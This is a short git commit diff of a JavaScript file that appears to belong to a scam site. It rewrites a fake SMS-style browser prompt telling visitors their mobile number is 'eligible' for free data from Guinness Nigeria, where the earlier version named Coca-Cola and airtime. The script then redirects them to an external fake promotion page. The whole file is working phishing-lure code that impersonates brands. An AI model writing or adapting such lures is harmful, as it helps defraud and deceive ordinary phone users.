7491afe8d8eb0c7b4524cb11e57e97f2d4feb21d
newblog13 <sweet16guyz@gmail.com>
2026-07-26 23:36:59 +0100

    Update coc-verify.js

--- coc-verify.js
+++ coc-verify.js
@@ -1,5 +1,5 @@
-var password = '75GB + ₦10,000 Airtime'
-password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 75GB + ₦10,000 Airtime From Coca-Cola, click OK to Activate now','75GB + ₦10,000 Airtime');
-if (password != '75GB + ₦10,000 Airtime') {
+var password = 'ACTIVATE 75GB'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 75GB From Guinness Nigeria, click OK to Activate now','ACTIVATE 75GB');
+if (password != 'ACTIVATE 75GB') {
 location.href='https://phivez.org/coca-anniversary.html';
 }
